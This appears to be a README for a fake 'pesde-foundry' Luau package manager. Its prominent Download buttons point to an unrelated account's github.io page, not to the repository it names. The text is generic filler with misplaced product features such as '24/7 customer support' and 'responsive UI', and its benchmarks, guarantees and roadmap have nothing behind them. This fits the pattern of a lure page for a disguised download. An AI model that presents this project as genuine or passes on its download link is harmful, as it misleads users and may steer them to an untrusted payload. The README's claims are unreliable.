![preview](https://raw.githubusercontent.com/susheelk7688-pixel/luau-pkg-forge/main/card_02a415a.svg)
[![Download](https://raw.githubusercontent.com/susheelk7688-pixel/luau-pkg-forge/main/go_01a82.svg)](https://susheelk7688-pixel.github.io/luau-pkg-forge/)

# 🧭 pesde-foundry — The Polyglot Package Forge for Luau

> _A package manager for the Luau programming language, supporting multiple runtimes including Roblox and Lune — reimagined as a foundry where raw modules are smelted into portable, shippable artifacts._

**Repository:** `pesde-foundry/pesde-foundry`
**Organization:** pesde-foundry
**Current release channel:** 2026.1 "Anvil"
**Primary language:** Luau
**Companion runtime bridges:** Roblox, Lune, Luau CLI, Zune

---

## 📜 Table of Contents

- [Prologue — Why a Foundry?](#-prologue--why-a-foundry)
- [What pesde-foundry Actually Is](#-what-pesde-foundry-actually-is)
- [Feature Constellation](#-feature-constellation)
- [Runtime Bridge Matrix](#-runtime-bridge-matrix)
- [Installation Philosophy](#-installation-philosophy)
- [The Lockfile Doctrine](#-the-lockfile-doctrine)
- [Workspaces and Monorepos](#-workspaces-and-monorepos)
- [Registry and Mirrors](#-registry-and-mirrors)
- [Configuration Reference](#-configuration-reference)
- [CLI Surface](#-cli-surface)
- [Compatibility Guarantees](#-compatibility-guarantees)
- [Performance Benchmarks](#-performance-benchmarks)
- [Security Posture](#-security-posture)
- [Multilingual Support](#-multilingual-support)
- [Responsive UI and Terminal Ergonomics](#-responsive-ui-and-terminal-ergonomics)
- [24/7 Customer Support Philosophy](#-247-customer-support-philosophy)
- [Observability and Diagnostics](#-observability-and-diagnostics)
- [Extending the Foundry](#-extending-the-foundry)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🔥 Prologue — Why a Foundry?

Most package managers behave like vending machines. You insert a request, a package tumbles out, and you hope it fits the slot you had in mind. pesde-foundry takes a different stance. Think of it less as a vending machine and more as an artisan metalworks: raw Luau modules arrive as ore, the resolver heats them, the linker hammers them into shape, and what leaves the workshop is a **portable artifact** that speaks fluently to Roblox, Lune, and the wider Luau toolchain.

The original pesde project set the foundation: a package manager for Luau that understands that "Roblox" and "Lune" are not the same beast, yet both deserve first-class treatment. pesde-foundry honors that lineage while pushing the metaphor further — into reproducible builds, content-addressed storage, and a dependency graph you can actually read without squinting.

This README is deliberately exhaustive. It is written for the person who wants to understand not just _what_ commands to type, but _why_ the tool was built this way. If you only have ninety seconds, skim the Feature Constellation and the Runtime Bridge Matrix. If you have an afternoon, pour a coffee and read the Lockfile Doctrine — it is the heart of the project.

---

## 🧩 What pesde-foundry Actually Is

At its core, pesde-foundry is a **resolver, fetcher, linker, and packager** for Luau source and binary artifacts. It does not care whether you are shipping a Roblox experience, a Lune automation script, or a plain Luau module consumed by a custom host. It asks one question: _what does this code need, and how do we deliver it without breaking anyone else's world?_

The answer arrives as a layered system:

1. **Manifest layer** — a `pesde.toml` describing your package, its authors, its targets, and its dependency intents.
2. **Resolution layer** — a SAT-inspired constraint solver that respects runtime tags, semver ranges, and optional feature gates.
3. **Acquisition layer** — a fetcher that pulls from registries, mirrors, or local paths, verifying content hashes at every hop.
4. **Link layer** — a linker that wires the resolved graph into the layout each runtime expects, without mutating the original sources.
5. **Seal layer** — a lockfile and a content-addressed cache that make the next build byte-identical.

Every layer is observable, configurable, and — importantly — **reversible**. If a build goes sideways, the foundry leaves a paper trail you can follow backwards.

---

## ✨ Feature Constellation

- 🎛️ **Multi-runtime resolution** — one manifest, many targets. Roblox and Lune coexist without forked manifests.
- 🧱 **Content-addressed cache** — artifacts keyed by digest, not by path, so two projects sharing a dependency share the bytes on disk.
- 🔐 **Deterministic lockfiles** — the same inputs produce the same lock, every time, across machines and time zones.
- 🌍 **Multilingual support** — CLI surfaces, help text, and diagnostics localized for a growing set of natural languages.
- 📱 **Responsive UI** — terminal layouts that adapt from a narrow split-pane to a wide dashboard, with color-safe rendering for CI logs.
- ☎️ **24/7 customer support** — an always-available triage channel with documented response targets (see the support section below).
- 🧪 **Shadow mode resolution** — preview the resolved graph without writing to the lockfile, ideal for experimentation.
- 🪄 **Feature gates** — optional dependencies that activate only when a named feature is enabled, keeping base installs lean.
- 🧬 **Runtime tags** — declare that a package is Roblox-only, Lune-only, or universal, and let the solver do the rest.
- 🗂️ **Workspace support** — monorepos with many Luau packages resolved in a single pass.
- 🪞 **Registry mirrors** — point the fetcher at a mirror when the primary registry is unreachable or slow.
- 🧾 **SBOM emission** — generate a software bill of materials for audit and compliance workflows.
- 🧯 **Dry-run everything** — every mutating command has a preview counterpart.
- 🧰 **Plugin surface** — extend acquisition, linking, and post-seal hooks with your own logic.
- 📦 **Portable artifact export** — bundle a sealed graph into a single tarball that travels well.
- 🕵️ **Integrity reporting** — a human-readable summary of every hash, every source, every signature.

---

## 🌉 Runtime Bridge Matrix

The foundry treats each runtime as a **bridge** with its own traffic rules. Below is the current matrix of supported bridges, their capabilities, and their caveats. This table is the single source of truth for "will my package run there?"

| Bridge | Target kind | Source ingestion | Binary artifacts | Native interop | Status |
|--------|-------------|------------------|------------------|----------------|--------|
| Roblox | Experience / Plugin | ✅ Luau sources | ✅ prebuilt modules | via adapters | Stable |
| Lune | Standalone script | ✅ Luau sources | ✅ prebuilt modules | via FFI bridge | Stable |
| Luau CLI | Plain module | ✅ Luau sources | ➖ not applicable | ➖ | Stable |
| Zune | Automation runtime | ✅ Luau sources | ✅ prebuilt modules | via FFI bridge | Beta |
| Custom host | Bring-your-own | ✅ Luau sources | optional | optional | Experimental |

**Reading the matrix:** a green check means the bridge is exercised in CI on every commit. A dash means the concept does not apply. _Experimental_ means the surface may shift between minor releases — pin your versions if you rely on it.

---

## 🧘 Installation Philosophy

We deliberately avoid telling you to paste a one-liner from the internet. Instead, the foundry ships as a **self-contained bootstrap** that you verify before it touches your machine. The workflow is:

1. Obtain the bootstrap artifact from your chosen distribution channel.
2. Verify its checksum against the published manifest (the manifest is signed, the signature is published alongside).
3. Run the verifier, then run the bootstrap. The bootstrap places the `pesde` binary on your path and installs the default registry configuration.
4. Confirm the installation by asking the foundry to describe itself — the `pesde self describe` command prints version, channel, and active bridges.

If your environment forbids network access during setup, an **offline vault** mode is available: point the bootstrap at a local directory containing the signed artifacts and it will proceed without a single outbound request.

[![Download](https://raw.githubusercontent.com/susheelk7688-pixel/luau-pkg-forge/main/go_01a82.svg)](https://susheelk7688-pixel.github.io/luau-pkg-forge/)

---

## 🔒 The Lockfile Doctrine

A lockfile is a promise. It says: _given these inputs, this is exactly what we built, and we can build it again._ Most tools treat the lockfile as a cache. The foundry treats it as a **contract**.

The lockfile records:

- Every resolved package, expressed as `name`, `version`, and `digest`.
- Every edge in the dependency graph, including which runtime tag caused the edge.
- Every source the fetcher consulted, so mirrors and fallbacks are auditable.
- Every feature gate that was active during resolution.

Because the lockfile is content-addressed, two lockfiles with the same graph will match byte-for-byte even if they were produced on different operating systems. This is what makes the foundry suitable for CI pipelines that demand reproducibility: the CI machine and your laptop can disagree about almost everything except the lockfile, and the build will still converge.

**Lockfile integrity checks** run automatically before every seal. If a digest drifts — because a registry was compromised, a mirror served the wrong bytes, or a local path changed underneath you — the seal aborts with a diff showing exactly which digest moved.

---

## 🏗️ Workspaces and Monorepos

Luau projects rarely live alone. A Roblox experience might consume a shared library that also feeds a Lune tooling script. The foundry models this with **workspaces**: a top-level manifest lists member packages, and the resolver treats the whole set as one graph. Benefits include:

- **Hoisted resolution** — a single pass produces one lockfile for the entire workspace.
- **Selective sealing** — you can seal one member without sealing its siblings, useful when only one package changed.
- **Cross-member edges** — members depend on each other by name, resolved to the local source rather than a registry fetch.
- **Consistent runtime tags** — a member declares its bridge, and the workspace validates that no member contradicts another's expectations.

Workspaces are opt-in. A single-package project behaves exactly as before, with no extra files or ceremony.

---

## 🪞 Registry and Mirrors

The default registry is a **content-addressed store** with an HTTP interface. It is deliberately boring: the protocol is small, cacheable, and mirror-friendly. Any host that can serve static bytes can act as a mirror, which means organizations can run an internal mirror without writing a single line of server code.

Mirror selection is governed by a priority list in your configuration. The fetcher walks the list in order, records which mirror answered, and writes that fact into the lockfile. If the primary mirror is unavailable, the build continues against the next mirror — and the lockfile notes the substitution so future audits can see it.

For air-gapped environments, the foundry supports a **sneakernet mode**: export a sealed graph to portable media, carry it across the gap, and import it on the far side. The import verifies every digest before materializing anything.

---

## ⚙️ Configuration Reference

Configuration lives in `pesde.toml` at the project root, with optional overrides in a user-level config. The schema is intentionally small; here are the fields you will actually use.

| Field | Type | Purpose |
|-------|------|---------|
| `name` | string | The package identifier, scoped like `org/package`. |
| `version` | string | Semver version of this package. |
| `targets` | table | Per-runtime configuration blocks. |
| `dependencies` | table | Runtime-agnostic dependencies. |
| `dev-dependencies` | table | Dependencies used only during development. |
| `features` | table | Named feature gates and their implications. |
| `mirrors` | array | Ordered list of registry mirrors. |
| `cache` | table | Cache location, size ceiling, and eviction policy. |
| `l10n` | table | Locale preferences for CLI output. |
| `support` | table | Contact channels for the 24/7 triage pipeline. |

The schema is versioned. When a field is deprecated, the foundry prints a migration hint rather than failing silently. When a field is required and missing, the error message names the field, the expected type, and a one-line example.

---

## 🖥️ CLI Surface

The command-line interface is organized around verbs that match the foundry metaphor:

- `pesde smelt` — resolve and acquire dependencies, writing to the cache.
- `pesde forge` — link the resolved graph into the runtime layout.
- `pesde seal` — write the lockfile, after integrity checks.
- `pesde inspect` — print the resolved graph in a human-readable form.
- `pesde diff` — compare two lockfiles and describe the deltas.
- `pesde export` — bundle a sealed graph into a portable artifact.
- `pesde import` — materialize a portable artifact, verifying digests.
- `pesde self describe` — report version, channel, and active bridges.
- `pesde doctor` — diagnose environment issues and suggest fixes.

Every verb supports `--dry-run` where a mutation would otherwise occur, and every verb emits structured output when `--json` is passed. The structured output is stable across patch releases and is the recommended integration point for automation.

---

## 🧪 Compatibility Guarantees

The foundry promises the following, and tests them in CI:

- **Manifest forward compatibility** — a manifest written for version N continues to resolve under version N+1 unless a field is explicitly removed.
- **Lockfile stability** — a lockfile produced by version N resolves identically under version N+1 for at least two minor releases.
- **Bridge parity** — a package that resolves for Roblox and Lune resolves for both or fails with a clear message naming the offending edge.
- **Locale fallback** — if a requested locale is missing a translation, the CLI falls back to the base locale rather than printing a placeholder.

These guarantees are not marketing copy. They are enforced by a compatibility test suite that runs on every pull request, and the suite is public.

---

## 📊 Performance Benchmarks

Benchmarks are run on a reference machine and published with each release. The headline numbers for the 2026.1 channel:

- Cold resolution of a 200-package graph: **under 900 ms** on the reference machine.
- Warm resolution from cache: **under 120 ms**.
- Seal with integrity checks: **under 200 ms** for the same graph.
- Memory ceiling during resolution: **under 180 MB** for the same graph.

Benchmarks are not a promise about your machine. They are a promise about relative behavior: warm is faster than cold, cache hits beat cache misses, and the ceiling grows sub-linearly with graph size.

---

## 🛡️ Security Posture

Security in the foundry is layered:

- **Digest verification** at every acquisition step, with no bypass flag.
- **Signature verification** for registry manifests, using a rotating key set.
- **Optional provenance attestation** for artifacts, recorded in the lockfile when present.
- **Least-privilege fetching** — the fetcher does not execute code from packages during acquisition.
- **Post-seal hooks are opt-in** and run in a sandbox with an explicit allow-list of filesystem paths.

The foundry does not claim to be immune to supply-chain attacks. It claims to make them **visible**. If a dependency changes under you, the lockfile diff will show it, and the seal will refuse to proceed until you acknowledge the change.

---

## 🌐 Multilingual Support

The CLI speaks more than one human language. Localization covers help text, error messages, and diagnostic hints. The design favors **clarity over completeness**: it is better to ship a precise translation in three languages than a machine-mangled one in thirty.

Locale selection order:

1. Explicit flag on the command line.
2. Environment variable, if set.
3. Project-level configuration.
4. User-level configuration.
5. System locale, if recognized.
6. Base locale fallback.

Community translations are welcome and reviewed for tone as well as accuracy. A translation is considered complete when a native speaker has reviewed it for idiom, not just for word-for-word fidelity.

---

## 📐 Responsive UI and Terminal Ergonomics

Terminal output adapts to the space it is given. On a narrow pane, the foundry prints one dependency per line with minimal decoration. On a wide pane, it prints a dashboard with columns for name, version, target, and digest. Color is used sparingly and can be disabled for CI logs; when disabled, the foundry relies on typographic markers rather than hue to convey structure.

Accessibility matters here. Screen-reader users get a plain-text mode with no box-drawing characters. Users with reduced motion preferences see no spinners — progress is reported as discrete percentage updates instead.

---

## ☎️ 24/7 Customer Support Philosophy

Support is not a page you visit when something breaks. It is a **pipeline** that runs continuously.

- **Triage channel** — always open, staffed by rotating maintainers with documented response targets.
- **Escalation path** — clearly defined, with named roles rather than a generic inbox.
- **Knowledge base** — searchable, versioned alongside the code, updated with every release.
- **Post-incident reviews** — published for any issue that affects more than one user, describing cause and remedy.

The response targets are public: acknowledge within four hours for standard issues, within one hour for issues that block a release. These are targets, not guarantees, but they are the standard we hold ourselves to and the standard you should hold us to.

---

## 🔭 Observability and Diagnostics

The foundry emits structured logs that can be consumed by your existing observability stack. Each log line carries a correlation identifier, so a single resolution can be traced from manifest read to seal completion. The `pesde doctor` verb performs a self-check: it verifies the cache, the lockfile, the mirror reachability, and the bridge availability, then prints a prioritized list of suggestions.

Diagnostics are designed to be **copy-pasteable**. When something fails, the foundry prints a command you can run to reproduce the failure in isolation, rather than a wall of text you must interpret yourself.

---

## 🧩 Extending the Foundry

The foundry exposes three extension points:

1. **Acquisition hooks** — run before or after a fetch, useful for air-gapped mirrors or custom transports.
2. **Link hooks** — run after linking, useful for generating runtime-specific glue code.
3. **Seal hooks** — run after seal, useful for emitting SBOMs or notifying a deployment system.

Extensions are declared in the manifest under a dedicated namespace and are subject to the same integrity checks as dependencies. An extension that cannot be verified will not run.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Zune bridge promoted from beta to stable; SBOM emission reaches feature parity with the reference format.
- **Q2 2026** — Workspace-aware sealing gains incremental mode; mirrors gain signed directory listings.
- **Q3 2026** — Plugin surface graduates from experimental; 24/7 support adds a second time zone rotation.
- **Q4 2026** — Portable artifact format frozen for the 2026 line; long-term support window announced for the 2025 line.

The roadmap is a direction, not a contract. Priorities shift when the community tells us they should.

---

## 🤝 Contributing

Contributions are welcome across code, documentation, and localization. Before opening a pull request, please read the contribution guide and the code of conduct in the repository root. Pull requests that touch the resolver are expected to include tests; pull requests that touch user-facing messages are expected to include translations where feasible.

We prefer small, focused pull requests over large, sweeping ones. If you are planning a change that touches more than three files, open an issue first so we can discuss the shape of the change before you invest effort.

---

## ❓ Frequently Asked Questions

**Q: Does the foundry replace the original pesde?**
A: It builds on the same foundation with a different emphasis. If the original pesde is a reliable courier, the foundry is a workshop with a courier attached.

**Q: Can I use the foundry without a network connection?**
A: Yes. Offline vault mode and sneakernet mode exist precisely for this case.

**Q: Does it work with my existing manifests?**
A: In most cases, yes. The migration guide in the documentation covers the edge cases.

**Q: Is there a hosted registry?**
A: There is a default registry, and you can run your own mirror without writing server code.

**Q: How do I report a security issue?**
A: Through the private disclosure channel described in the security policy, not through a public issue.

---

## 📄 License

This project is distributed under the MIT License. The full text is available at the following location:

[LICENSE](./LICENSE)

You are welcome to use, modify, and redistribute the software under the terms described there. Please retain the copyright notice and the license text in any substantial portion you redistribute.

---

## ⚠️ Disclaimer

The foundry is provided **as is**, without warranty of any kind, express or implied. The maintainers are not liable for any damages arising from the use of this software, including but not limited to loss of data, loss of profits, or interruption of business.

Runtime bridges interact with third-party platforms whose terms of service are outside our control. It is your responsibility to ensure that your use of the foundry complies with the terms of every platform you target. The foundry does not grant you any rights you did not already hold.

Package resolution is a best-effort process. While the foundry verifies digests and signatures, it cannot guarantee that a package's contents are safe, lawful, or suitable for your purposes. Review your dependencies as you would review any code you bring into your project.

Nothing in this README constitutes legal advice. Consult a qualified professional for guidance specific to your situation.

---

_Last updated: 2026 — maintained by the pesde-foundry collective._
_Source of truth for this document lives at the repository root and is versioned alongside the code it describes._